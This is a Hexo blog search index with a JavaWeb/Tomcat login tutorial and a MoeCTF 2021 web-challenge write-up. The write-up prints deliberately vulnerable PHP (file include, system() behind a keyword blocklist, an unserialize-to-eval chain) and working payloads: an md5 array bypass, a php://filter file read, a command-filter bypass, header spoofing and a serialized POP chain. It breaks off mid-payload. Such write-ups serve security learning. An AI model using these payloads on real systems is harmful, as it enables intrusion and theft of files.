<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>初探前后端交互</title>
    <link href="/2021/09/29/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/"/>
    <url>/2021/09/29/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/</url>
    
    <content type="html"><![CDATA[<h1 id="初探前后端交互"><a href="#初探前后端交互" class="headerlink" title="初探前后端交互"></a>初探前后端交互</h1><h2 id="如有错误请不吝指出"><a href="#如有错误请不吝指出" class="headerlink" title="如有错误请不吝指出"></a>如有错误请不吝指出</h2><span id="more"></span><h6 id="由于学习网络协议，需通过C-S进行试验，故利用JavaWeb-TomCat搭建本地服务。由于本人没有服务器开发经验，故此文章仅记录搭建基础操作"><a href="#由于学习网络协议，需通过C-S进行试验，故利用JavaWeb-TomCat搭建本地服务。由于本人没有服务器开发经验，故此文章仅记录搭建基础操作" class="headerlink" title="由于学习网络协议，需通过C/S进行试验，故利用JavaWeb+TomCat搭建本地服务。由于本人没有服务器开发经验，故此文章仅记录搭建基础操作"></a>由于学习网络协议，需通过C/S进行试验，故利用JavaWeb+TomCat搭建本地服务。由于本人没有服务器开发经验，故此文章仅记录搭建基础操作</h6><h2 id="Step1-准备"><a href="#Step1-准备" class="headerlink" title="Step1(准备):"></a>Step1(准备):</h2><ol><li><h6 id="创建空pooject并导入java模块"><a href="#创建空pooject并导入java模块" class="headerlink" title="创建空pooject并导入java模块"></a>创建空pooject并导入java模块</h6></li><li><h6 id="添加JavaWeb框架"><a href="#添加JavaWeb框架" class="headerlink" title="添加JavaWeb框架"></a>添加JavaWeb框架</h6></li><li><h6 id="部署TomCat以及导入Tomcat外部库-相当于服务器托管给TomCat"><a href="#部署TomCat以及导入Tomcat外部库-相当于服务器托管给TomCat" class="headerlink" title="部署TomCat以及导入Tomcat外部库(相当于服务器托管给TomCat)"></a>部署TomCat以及导入Tomcat外部库(相当于服务器托管给TomCat)</h6></li></ol><h2 id="Step2-前端测试-："><a href="#Step2-前端测试-：" class="headerlink" title="Step2(前端测试)："></a>Step2(前端测试)：</h2><ol><li><h6 id="web文件夹下创建HTML文件夹用于存放HTML代码，以下为本地测试HTML代码"><a href="#web文件夹下创建HTML文件夹用于存放HTML代码，以下为本地测试HTML代码" class="headerlink" title="web文件夹下创建HTML文件夹用于存放HTML代码，以下为本地测试HTML代码"></a>web文件夹下创建HTML文件夹用于存放HTML代码，以下为本地测试HTML代码</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>this is a test .html<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="2-Web文件夹相当于网站根路径-访问http-localhost-8080-html-test-html即可访问"><a href="#2-Web文件夹相当于网站根路径-访问http-localhost-8080-html-test-html即可访问" class="headerlink" title="2.Web文件夹相当于网站根路径,访问http://localhost:8080/html/test.html即可访问"></a>2.Web文件夹相当于网站根路径,访问<a href="http://localhost:8080/html/test.html%E5%8D%B3%E5%8F%AF%E8%AE%BF%E9%97%AE">http://localhost:8080/html/test.html即可访问</a></h6></li></ol><h2 id="Step3-前后端交互"><a href="#Step3-前后端交互" class="headerlink" title="Step3(前后端交互):"></a>Step3(前后端交互):</h2><ol><li><h6 id="web文件夹下创建login-html-构建一个form表单"><a href="#web文件夹下创建login-html-构建一个form表单" class="headerlink" title="web文件夹下创建login.html,构建一个form表单"></a>web文件夹下创建login.html,构建一个form表单</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/study/login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>用户名<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>密码<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><h6 id="src文件夹下创建LoginServlet-java"><a href="#src文件夹下创建LoginServlet-java" class="headerlink" title="src文件夹下创建LoginServlet.java"></a>src文件夹下创建LoginServlet.java</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mj.servlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(&quot;/login&quot;)</span>  <span class="hljs-comment">//相当于在网站根路径创建文件login</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br><span class="hljs-comment">//        super.doGet(req, resp);</span><br>        System.out.println(<span class="hljs-string">&quot;doget---&quot;</span>);<br>        String username = req.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br>        String password = req.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br>        System.out.println(username+<span class="hljs-string">&quot; &quot;</span>+password);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;123&quot;</span>.equals(username)&amp;&amp;<span class="hljs-string">&quot;456&quot;</span>.equals(password))&#123;<br>            <span class="hljs-comment">//登录成功</span><br>            resp.getWriter().write(<span class="hljs-string">&quot;login success&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            resp.getWriter().write(<span class="hljs-string">&quot;login failure&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><h6 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h6><h6 id="在http-localhost-8080-study-html-login-html输入用户名和密码"><a href="#在http-localhost-8080-study-html-login-html输入用户名和密码" class="headerlink" title="在http://localhost:8080/study/html/login.html输入用户名和密码"></a>在<a href="http://localhost:8080/study/html/login.html%E8%BE%93%E5%85%A5%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81">http://localhost:8080/study/html/login.html输入用户名和密码</a></h6><p><img src="%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/2.png" alt="2"></p><h6 id="即可跳转到localhost-8080-study-login"><a href="#即可跳转到localhost-8080-study-login" class="headerlink" title="即可跳转到localhost:8080/study/login"></a>即可跳转到localhost:8080/study/login</h6></li></ol><p><img src="%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/3.png" alt="2"></p><h6 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h6><p><img src="%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/1.png" alt="2"></p>]]></content>
    
    
    <categories>
      
      <category>前后端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>前后端</tag>
      
      <tag>网络协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MoeCTF</title>
    <link href="/2021/09/26/moectf/"/>
    <url>/2021/09/26/moectf/</url>
    
    <content type="html"><![CDATA[<h1 id="MoeCTF-2021-Write-Up"><a href="#MoeCTF-2021-Write-Up" class="headerlink" title="MoeCTF-2021 Write Up"></a>MoeCTF-2021 Write Up</h1><span id="more"></span><h4 id="人生第一篇wp，如有错误请不吝指出"><a href="#人生第一篇wp，如有错误请不吝指出" class="headerlink" title="人生第一篇wp，如有错误请不吝指出"></a>人生第一篇wp，如有错误请不吝指出</h4><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h6 id="1-Web安全入门指北—GET"><a href="#1-Web安全入门指北—GET" class="headerlink" title="1.Web安全入门指北—GET"></a>1.Web安全入门指北—GET</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">payload:<span class="hljs-attribute">moe</span>=flag<br></code></pre></td></tr></table></figure><h6 id="2-Web安全入门指北—POST"><a href="#2-Web安全入门指北—POST" class="headerlink" title="2.Web安全入门指北—POST"></a>2.Web安全入门指北—POST</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1.利用hackbar传入post参数<span class="hljs-attribute">moe</span>=flag<br>2.利用bp(burpsuite)抓包更改post参数为<span class="hljs-attribute">moe</span>=flag<br>3.利用python requests库写脚本<br></code></pre></td></tr></table></figure><h6 id="3-Web安全入门指北—小饼干"><a href="#3-Web安全入门指北—小饼干" class="headerlink" title="3.Web安全入门指北—小饼干"></a>3.Web安全入门指北—小饼干</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.利用bp抓包将cookie中的vip设为<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h6 id="4-2048"><a href="#4-2048" class="headerlink" title="4.2048"></a>4.2048</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">起初思路:<br><span class="hljs-number">1.</span>查看网页js代码可知分数由score参数控制，故想在<span class="hljs-built_in">console</span>更改score初始值，提交到网页后端。未遂<br>正确解法:<br><span class="hljs-number">2.</span>仔细审查源代码发现<br><span class="hljs-attr">getFlag</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> XMLHttpRequest;<br>req.open(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;flag.php?score=&quot;</span>+obj.score,<span class="hljs-literal">true</span>);<br>req.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>alert(<span class="hljs-built_in">this</span>.responseText);<br>&#125;<br>req.send();<br>&#125;<br>&#125;<br>故只需构造payload:?score=<span class="hljs-number">500000</span>即可<br></code></pre></td></tr></table></figure><h6 id="5-Web-Inc"><a href="#5-Web-Inc" class="headerlink" title="5.Web_Inc"></a>5.Web_Inc</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">题目源码:<br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>!=<span class="hljs-variable">$b</span>&amp;&amp;md5(<span class="hljs-variable">$a</span>)===md5(<span class="hljs-variable">$b</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;try again&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span>考察知识<br><span class="hljs-built_in">get</span>/<span class="hljs-built_in">post</span> md5绕过<br><span class="hljs-number">2.</span>解决方法<br>===会比较类型，可以用到PHP中md5()函数无法处理数组（会返回<span class="hljs-literal">NULL</span>）来实现绕过。<br>构造payload:<br><span class="hljs-keyword">a</span>[]=<span class="hljs-number">1</span> b[]=<span class="hljs-number">2</span>即可<br></code></pre></td></tr></table></figure><h6 id="6-ezinclude"><a href="#6-ezinclude" class="headerlink" title="6.ezinclude"></a>6.ezinclude</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">题目源码：<br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.考察知识<br>php远程文件包含漏洞 base64加解密<br><span class="hljs-number">2</span>.解决方法<br>构造payload:file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br>详情请参考博客:https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/lilongsy/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">108146107</span><br>base64加解密百度在线网站即可<br></code></pre></td></tr></table></figure><h6 id="7-babeRCE"><a href="#7-babeRCE" class="headerlink" title="7.babeRCE"></a>7.babeRCE</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">题目源码:<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$rce</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;rce&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$rce</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="hljs-variable">$rce</span>)) &#123;<br>        system(<span class="hljs-variable">$rce</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hhhhhhacker!!!&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.考察知识<br>命令执行漏洞绕过<br><span class="hljs-number">2</span>.解决方法<br>构造payload:rce=whoami可知直接通过过滤执行cat flag即可<br>百度常见绕过方式，可得<br>构造payload:rce=ca\t<span class="hljs-variable">$&#123;IFS&#125;</span>fla\g.php即可<br>详情请参考博客:https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/SpouseLJ/</span>p/<span class="hljs-number">13223967</span>.html<br><br></code></pre></td></tr></table></figure><h6 id="8-Do-you-know-HTTP"><a href="#8-Do-you-know-HTTP" class="headerlink" title="8.Do you know HTTP?"></a>8.Do you know HTTP?</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.考察知识<br>http header<br><span class="hljs-number">2</span>.解决方法<br>网页发现给出三个提示<br><span class="hljs-number">1</span>)用<span class="hljs-string">&#x27;HS&#x27;</span>来请求试试？<br><span class="hljs-number">2</span>)只有本地ip地址才可以哦！<br><span class="hljs-number">3</span>)<span class="hljs-string">&#x27;LT&#x27;</span>才是本题官方浏览器哦！<br>利用bp抓包按需更改请求包为<br>HS <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span><br>        Host: <span class="hljs-number">47.93</span>.<span class="hljs-number">215.154</span>:<span class="hljs-number">5002</span><br>        Cache-Control: max-age=<span class="hljs-number">0</span><br>        Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>        User-Agent: LT<br>        Accept: text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,image/</span>avif,image<span class="hljs-regexp">/webp,image/</span>apng,*<span class="hljs-regexp">/*;q=0.8,application/</span>signed-exchange;v=b3;q=<span class="hljs-number">0.9</span><br>        Accept-Encoding: gzip, deflate<br>        Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>        Connection: close<br>        X-Forwarded-For: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>        Referer: www.ltyyds.com<br>        即可<br></code></pre></td></tr></table></figure><h6 id="9-eeeeeeeeeeezunserialize"><a href="#9-eeeeeeeeeeezunserialize" class="headerlink" title="9.eeeeeeeeeeezunserialize"></a>9.eeeeeeeeeeezunserialize</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php">题目源码:<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">entrance</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$start</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;start = <span class="hljs-variable">$start</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;start-&gt;helloworld();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">springboard</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$middle</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;middle-&gt;hs;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$end</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;end = <span class="hljs-variable">$end</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$Attribute</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;end);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;serialize&#x27;</span>])) &#123;<br>    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;serialize&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-number">1.</span>考察知识<br>php魔方方法 php序列化/反序列化<br><span class="hljs-number">2.</span>解题方法<br><span class="hljs-number">1</span>)审查源代码可发现存在<span class="hljs-built_in">eval</span>()危险函数<br><span class="hljs-number">2</span>)分析代码逻辑及类名可知思路<br>entrance创建(销毁时调用springboard.call方法)-&gt;springboard创建-&gt;springboard.call调用创建evil方法-&gt;执行evil成员变量end=system(<span class="hljs-string">&#x27;cat flag&#x27;</span>);<br><span class="hljs-number">3</span>)利用phpstudy本地脚本输出<br>$payload = <span class="hljs-keyword">new</span> entrance(<span class="hljs-keyword">new</span> springboard(<span class="hljs-keyword">new</span> evil(<span class="hljs-string">&quot;system(&#x27;cat flag&#x27;);&quot;</span>)));<br>echo serialize($payload);<br>得到序列化后的payload:O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;entrance&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;springboard&quot;</span>:<span class="hljs-number">1</span>: &#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;middle&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span 